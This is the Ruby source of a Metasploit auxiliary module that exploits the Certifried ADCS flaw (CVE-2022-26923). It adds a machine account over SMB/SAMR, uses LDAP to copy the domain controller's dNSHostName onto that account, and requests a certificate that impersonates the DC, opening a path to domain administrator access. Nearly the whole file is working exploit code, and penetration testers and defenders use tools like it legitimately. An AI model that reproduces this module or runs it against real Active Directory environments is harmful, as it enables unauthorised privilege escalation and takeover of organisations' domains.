##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Exploit::Remote::LDAP
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::MsAdcs
  include Msf::Exploit::Remote::SamrComputer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Active Directory Certificate Services (ADCS) privilege escalation (Certifried)',
        'Description' => %q{
          This module exploits a privilege escalation vulnerability in Active
          Directory Certificate Services (ADCS) to generate a valid certificate
          impersonating the Domain Controller computer account. This
          certificate can be used along with Certipy or BloodyAD to get a TGT
          and access the DC as an Administrator.

          This will go through the following steps:
          1. Create a computer account
          2. Change the new computer's dNSHostName attribute to match that of the DC
          3. Request a certificate for this computer account and store it in the loot
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'CravateRouge', # bloodyAD implementation and original blog post author
          'Erik Wynter', # MSF module
          'Christophe De La Fuente' # MSF module
        ],
        'References' => [
          ['URL', 'https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html'],
        ],
        'Notes' => {
          'Reliability' => [CRASH_SAFE],
          'Stability' => [],
          'SideEffects' => [ IOC_IN_LOGS ]
        },
        'Actions' => [
          [ 'REQUEST_CERT', { 'Description' => 'Request a certificate' } ]
        ],
        'DefaultAction' => 'REQUEST_CERT',
        'DefaultOptions' => {
          'RPORT' => 445,
          'SSL' => true,
          'SMBDomain' => '',
          'CERT_TEMPLATE' => 'Machine'
        }
      )
    )

    register_options([
      OptString.new('DC_NAME', [ true, 'Name of the domain controller being targeted (must match RHOST)' ]),
      OptInt.new('LDAP_PORT', [true, 'LDAP port (default is 389 and default encrypted is 636)', 636]), # Set to 636 for legacy SSL
    ])

    deregister_options('BIND_DN', 'BIND_PW')
  end

  def run
    validate_options

    unless can_add_computer?
      fail_with(Failure::NoAccess, 'Machine account quota is zero, this user cannot create a computer account')
    end

    opts = {}
    opts[:tree] = connect_smb
    computer_info = add_computer(opts)
    disconnect_smb(opts.delete(:tree))

    impersonate_dc(computer_info.name)

    opts = {
      username: computer_info.name,
      password: computer_info.password
    }
    opts[:tree] = connect_smb(opts)
    request_certificate(opts)
  rescue SamrComputerConnectionError, MsAdcsConnectionError => e
    fail_with(Failure::Unreachable, e.message)
  rescue SamrComputerAuthentcationError, MsAdcsAuthentcationError => e
    fail_with(Failure::NoAccess, e.message)
  rescue SamrComputerNotFoundError, MsAdcsNotFoundError => e
    fail_with(Failure::NotFound, e.message)
  rescue SamrComputerBadConfigError => e
    fail_with(Failure::BadConfig, e.message)
  rescue SamrComputerUnexpectedReplyError, MsAdcsUnexpectedReplyError => e
    fail_with(Failure::UnexpectedReply, e.message)
  rescue SamrComputerUnknownError, MsAdcsUnknownError => e
    fail_with(Failure::Unknown, e.message)
  ensure
    disconnect_smb(opts.delete(:tree)) if opts[:tree]
    opts = {
      tree: connect_smb,
      computer_name: computer_info&.name
    }
    begin
      delete_computer(opts) if opts[:tree] && opts[:computer_name]
    rescue SamrComputerUnknownError => e
      print_warning("Unable to delete the computer account, this will have to be done manually with an Administrator account (#{e.message})")
    end
    disconnect_smb(opts.delete(:tree)) if opts[:tree]
  end

  def validate_options
    if datastore['SMBUser'].blank?
      fail_with(Failure::BadConfig, 'SMBUser not set')
    end
    if datastore['SMBPass'].blank?
      fail_with(Failure::BadConfig, 'SMBPass not set')
    end
    if datastore['SMBDomain'].blank?
      fail_with(Failure::BadConfig, 'SMBDomain not set')
    end
  end

  def connect_smb(opts = {})
    username = opts[:username] || datastore['SMBUser']
    password = opts[:password] || datastore['SMBPass']
    domain = opts[:domain] || datastore['SMBDomain']
    vprint_status("Connecting SMB with #{username}.#{domain}:#{password}")
    begin
      ssl_option_bak = datastore['SSL']
      datastore['SSL'] = false
      connect
      datastore['SSL'] = ssl_option_bak
    rescue Rex::ConnectionError, RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      simple.login(
        datastore['SMBName'],
        username,
        password,
        domain,
        datastore['SMB::VerifySignature'],
        datastore['NTLM::UseNTLMv2'],
        datastore['NTLM::UseNTLM2_session'],
        datastore['NTLM::SendLM'],
        datastore['NTLM::UseLMKey'],
        datastore['NTLM::SendNTLM'],
        datastore['SMB::Native_OS'],
        datastore['SMB::Native_LM'],
        { use_spn: datastore['NTLM::SendSPN'], name: rhost }
      )
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e})")
    end
    report_service(
      host: rhost,
      port: rport,
      host_name: simple.client.default_name,
      proto: 'tcp',
      name: 'smb',
      info: "Module: #{fullname}, last negotiated version: SMBv#{simple.client.negotiated_smb_version} (dialect = #{simple.client.dialect})"
    )

    begin
      simple.client.tree_connect("\\\\#{sock.peerhost}\\IPC$")
    rescue RubySMB::Error::RubySMBError => e
      fail_with(Failure::Unreachable, "Unable to connect to the remote IPC$ share ([#{e.class}] #{e})")
    end
  end

  def disconnect_smb(tree)
    vprint_status('Disconnecting SMB')
    tree.disconnect! if tree
    simple.client.disconnect!
  rescue RubySMB::Error::RubySMBError => e
    print_warning("Unable to disconnect SMB ([#{e.class}] #{e})")
  end

  def can_add_computer?
    vprint_status('Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...')

    quota = nil
    begin
      ldap_open do |ldap|
        ldap_options = {
          filter: Net::LDAP::Filter.eq('objectclass', 'domainDNS'),
          attributes: 'ms-DS-MachineAccountQuota',
          return_result: false
        }
        ldap.search(ldap_options) do |entry|
          quota = entry['ms-ds-machineaccountquota']&.first&.to_i
        end
      end
    rescue Net::LDAP::Error => e
      print_error("LDAP error: #{e.class}: #{e.message}")
    end

    if quota.blank?
      print_warning('Received no result when trying to obtain ms-DS-MachineAccountQuota. Adding a computer account may not work.')
      return true
    end

    vprint_status("ms-DS-MachineAccountQuota = #{quota}")
    quota > 0
  end

  def print_ldap_error(ldap)
    opres = ldap.get_operation_result
    msg = "LDAP error #{opres.code}: #{opres.message}"
    unless opres.error_message.to_s.empty?
      msg += " - #{opres.error_message}"
    end
    print_error("#{peer} #{msg}")
  end

  def ldap_open
    ldap_peer = "#{rhost}:#{datastore['LDAP_PORT']}"
    base = datastore['SMBDomain'].split('.').map { |dc| "dc=#{dc}" }.join(',')
    ldap_options = {
      port: datastore['LDAP_PORT'],
      base: base,
      auth: {
        username: "#{datastore['SMBUser']}@#{datastore['SMBDomain']}",
        password: datastore['SMBPass'],
        method: :simple
      }
    }

    ldap_connect(ldap_options) do |ldap|
      if ldap.get_operation_result.code != 0
        print_ldap_error(ldap)
        break
      end
      print_good("Successfully authenticated to LDAP (#{ldap_peer})")
      yield ldap
    end
  end

  def get_dnshostname(ldap, c_name)
    dnshostname = nil
    filter1 = Net::LDAP::Filter.eq('Name', c_name.delete_suffix('$'))
    filter2 = Net::LDAP::Filter.eq('objectclass', 'computer')
    joined_filter = Net::LDAP::Filter.join(filter1, filter2)
    ldap_options = {
      filter: joined_filter,
      attributes: 'DNSHostname',
      return_result: false

    }
    ldap.search(ldap_options) do |entry|
      dnshostname = entry[:dnshostname]&.first
    end
    vprint_status("Retrieved original DNSHostame #{dnshostname} for #{c_name}") if dnshostname
    dnshostname
  end

  def impersonate_dc(computer_name)
    ldap_open do |ldap|
      dc_dnshostname = get_dnshostname(ldap, datastore['DC_NAME'])
      print_status("Attempting to set the DNS hostname for the computer #{computer_name} to the DNS hostname for the DC: #{datastore['DC_NAME']}")
      domain_to_ldif = datastore['SMBDomain'].split('.').map { |dc| "dc=#{dc}" }.join(',')
      computer_dn = "cn=#{computer_name.delete_suffix('$')},cn=computers,#{domain_to_ldif}"
      ldap.modify(dn: computer_dn, operations: [[ :add, :dnsHostName, dc_dnshostname ]])
      new_computer_hostname = get_dnshostname(ldap, computer_name)
      if new_computer_hostname != dc_dnshostname
        fail_with(Failure::Unknown, 'Failed to change the DNS hostname')
      end
      print_good('Successfully changed the DNS hostname')
    end
  rescue Net::LDAP::Error => e
    print_error("LDAP error: #{e.class}: #{e.message}")
  end

end
